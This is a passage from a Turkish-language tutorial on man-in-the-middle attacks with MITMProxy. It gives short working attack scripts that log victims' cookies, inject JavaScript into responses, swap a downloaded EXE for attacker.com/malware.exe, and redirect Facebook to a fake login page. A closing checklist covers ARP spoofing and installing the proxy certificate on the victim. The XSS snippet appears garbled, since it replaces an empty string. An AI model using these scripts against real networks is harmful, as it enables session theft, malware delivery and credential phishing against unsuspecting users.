 cookies = flow.request.headers.get("Cookie", "")
 if cookies:
 ctx.log.info(f"Çerezler: {cookies}")

📌 Bu betik, tüm çerezleri MITMProxy loglarına kaydeder.

📌 Saldırı 3: Web Sayfasına Zararlı JavaScript Ekleme (XSS)
Bir web sitesine zararlı JavaScript kodu enjekte edebilirsiniz:
python
from mitmproxy import http

def response(flow: http.HTTPFlow):
 if "target.com" in flow.request.pretty\_url:
 flow.response.text = flow.response.text.replace("", "alert('XSS HACKED');")

📌 Bu betik, "target.com" yanıtına XSS saldırısı enjekte eder.

📌 Saldırı 4: Kullanıcının İndirdiği Dosyaları Değiştirme
Bir kullanıcının indirdiği EXE dosyalarını değiştirebilirsiniz:
python
from mitmproxy import http

def request(flow: http.HTTPFlow):
 if "example.com/software.exe" in flow.request.pretty\_url:
 flow.request.url = "http://attacker.com/malware.exe"

📌 Bu betik, hedef kullanıcının indirdiği dosyayı saldırganın zararlı dosyasıyla değiştirir.

📌 Saldırı 5: Kullanıcıyı Farklı Bir Siteye Yönlendirme
MITMProxy kullanarak tüm trafiği saldırganın sitesine yönlendirebilirsiniz:
python
from mitmproxy import http

def request(flow: http.HTTPFlow):
 if "facebook.com" in flow.request.pretty\_url:
 flow.request.url = "http://attacker.com/fake-facebook"

📌 Bu betik, Facebook giriş sayfasını sahte bir siteye yönlendirir.

4. MITMProxy ile Trafiği İzleme ve Manipüle Etme
Saldırıları manuel olarak gerçekleştirmek için MITMProxy’nin GUI aracını kullanabilirsiniz.
Başlatmak için:
bash
sudo mitmweb --mode transparent
Ardından http://127.0.0.1:8081 adresine giderek trafik akışını manuel olarak düzenleyebilirsiniz.

5. Sonuç
MITMProxy kullanarak MITM saldırıları yapmak için: ✔ Ağ trafiğini MITMProxy’ye yönlendirin (ARP Spoofing, iptables)
✔ MITMProxy sertifikasını kurbana yükleyerek HTTPS trafiğini okuyun
✔ İstekleri ve yanıtları manipüle ederek saldırılar gerçekleştirin
